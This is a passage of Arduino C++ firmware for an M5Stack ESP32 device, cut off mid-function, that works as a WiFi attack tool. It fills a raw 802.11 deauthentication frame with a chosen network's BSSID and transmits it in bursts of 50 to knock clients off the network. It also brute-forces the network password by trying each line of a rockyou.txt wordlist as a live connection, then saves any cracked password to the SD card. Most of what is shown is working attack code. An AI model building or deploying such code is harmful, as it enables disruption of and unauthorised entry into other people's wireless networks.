#include "M5Stack.h"
#include "WiFi.h"
#include "SD.h"
#include "ArduinoJson.h"
#include "WiFiManager.h"

#define ROCKYOU_PATH "/rockyou.txt"
#define SETTINGS_PATH "/settings.json"

#if !defined(VSPI)
#define VSPI FSPI
#endif

#if !defined(GPIO)
#include "driver/gpio.h"
#endif

struct NetworkInfo {
  String ssid;
  String bssid;
  int rssi;
  int channel;
  bool has_password;
  String password;
};

std::vector<NetworkInfo> networks;
NetworkInfo selectedNetwork;
uint8_t deauthPacket[26] = {
    0xC0, 0x00, 0x3A, 0x01, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00
};

WiFiManager wifiManager;

void crackNetworkPassword();
void deauthNetwork();
void handleHandshakes();
void fillDeauthPacket(const String &bssid);
String crackPassword(const String &ssid, const String &bssid);
bool tryPassword(const String &ssid, const String &bssid, const String &password);
void displayNetworkInfo(const NetworkInfo &network);
void loadNetworksFromSD();
void saveNetworksToSD();
void setupFirmware();
void displayMenu();
void displaySettingsMenu();
void adjustBrightness();
void togglePromiscuousMode();
void resetNetworkSettings();
void scanNetworks();
void selectNetwork();
void showNetworkInfo();
void pwnNetwork();
void enterDeepSleep();
void setPromiscuousMode(bool enable);
void sendDeauthPackets(int count);
void promiscuous_rx_cb(void* buf, wifi_promiscuous_pkt_type_t type);

void crackNetworkPassword() {
  if (!selectedNetwork.ssid.isEmpty()) {
    selectedNetwork.password = crackPassword(selectedNetwork.ssid, selectedNetwork.bssid);
    saveNetworksToSD();
    displayNetworkInfo(selectedNetwork);
  } else {
    M5.Lcd.clear();
    M5.Lcd.setCursor(0, 0);
    M5.Lcd.println("No network selected.");
  }
}

void deauthNetwork() {
  if (!selectedNetwork.ssid.isEmpty()) {
    setPromiscuousMode(true);
    fillDeauthPacket(selectedNetwork.bssid);
    sendDeauthPackets(50);
    setPromiscuousMode(false);
  } else {
    M5.Lcd.clear();
    M5.Lcd.setCursor(0, 0);
    M5.Lcd.println("No network selected.");
  }
}

void handleHandshakes() {
  if (selectedNetwork.ssid.isEmpty()) {
    M5.Lcd.clear();
    M5.Lcd.setCursor(0, 0);
    M5.Lcd.println("No network selected.");
    return;
  }

  setPromiscuousMode(true);
  fillDeauthPacket(selectedNetwork.bssid);

  for (int i = 0; i < 50; ++i) {
    esp_wifi_80211_tx(WIFI_IF_STA, deauthPacket, sizeof(deauthPacket), false);
    delay(50);
  }

  setPromiscuousMode(false);
}

void fillDeauthPacket(const String &bssid) {
  for (int i = 0; i < 6; ++i) {
    deauthPacket[10 + i] = strtol(bssid.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
    deauthPacket[16 + i] = strtol(bssid.substring(i * 3, i * 3 + 2).c_str(), NULL, 16);
  }
}

String crackPassword(const String &ssid, const String &bssid) {
  File rockyouFile = SD.open(ROCKYOU_PATH, FILE_READ);
  if (!rockyouFile) {
    Serial.println("Failed to open rockyou.txt.");
    return "";
  }

  long fileSize = rockyouFile.size();
  long bytesRead = 0;
  String password;
  String line;
  M5.Lcd.clear();
  M5.Lcd.setCursor(0, 0);
  M5.Lcd.setTextSize(2);
  M5.Lcd.println("Cracking Password...");

  while (rockyouFile.available()) {
    line = rockyouFile.readStringUntil('\n');
    bytesRead += line.length() + 1;
    line.trim();
    if (tryPassword(ssid, bssid, line)) {
      password = line;
      break;
    }

    int progress = (int)((bytesRead / (float)fileSize) * 100);
    M5.Lcd.fillRect(0, 50, 320, 20, TFT_BLACK);
    M5.Lcd.setCursor(0, 50);
    M5.Lcd.printf("Progress: %d%%", progress);

    M5.update();
    if (M5.BtnA.wasPressed() || M5.BtnB.wasPressed() || M5.BtnC.wasPressed()) {
      M5.Lcd.println("User interrupted the process.");
      break;
    }
  }

  rockyouFile.close();
  return password;
}

bool tryPassword(const String &ssid, const String &bssid, const String &password) {
  Serial.printf("Trying password: %s for SSID: %s\n", password.c_str(), ssid.c_str());

  WiFi.disconnect();
  delay(100);
  WiFi.begin(ssid.c_str(), password.c_str());

  unsigned long startTime = millis();
  while (WiFi.status() != WL_CONNECTED && (millis() - startTime) < 10000) {
    delay(200);
    Serial.print(".");
  }
  
  bool isConnected = (WiFi.status() == WL_CONNECTED);
  
  if (isConnected) {
    Serial.println("Connected!");
    WiFi.disconnect();
    return true;
  } else {
    Serial.println("Failed to connect.");
    return false;
  }
}

void displayNetworkInfo(const NetworkInfo &network) {
  M5.Lcd.clear();
  M5.Lcd.setCursor(0, 0);
  M5.Lcd.setTextSize(2);
  M5.Lcd.printf("SSID: %s\n", network.ssid.c_str());
  M5.Lcd.printf("BSSID: %s\n", network.bssid.c_str());
  M5.Lcd.printf("RSSI: %d dBm\n", network.rssi);
  M5.Lcd.printf("Channel: %d\n", network.channel);
  M5.Lcd.printf("Has Password: %s\n", network.has_password ? "Yes" : "No");
  if (network.has_password) {
    M5.Lcd.printf("Password: %s\n", network.password.isEmpty() ? "Not cracked" : network.password.c_str());
  }
}

void loadNetworksFromSD() {
  File file = SD.open("/networks.json", FILE_READ);
  if (!file) {
    Serial.println("Failed to open networks.json.");
    return;
  }
  
  DynamicJsonDocument doc(2048);
  DeserializationError error = deserializeJson(doc, file);
  if (error) {
    Serial.println("Failed to parse JSON.");
    file.close();
    return;
  }
  
  networks.clear();
  for (JsonObject network : doc["networks"].as<JsonArray>()) {
    NetworkInfo net;
    net.ssid = network["ssid"].as<String>();
    net.bssid = network["bssid"].as<String>();
    net.rssi = network["rssi"].as<int>();
    net.channel = network["channel"].as<int>();
    net.has_password = network["has_password"].as<bool>();
    net.password = network["password"].as<String>();
    networks.push_back(net);
  }
  
  file.close();
}

void saveNetworksToSD() {
  File file = SD.open
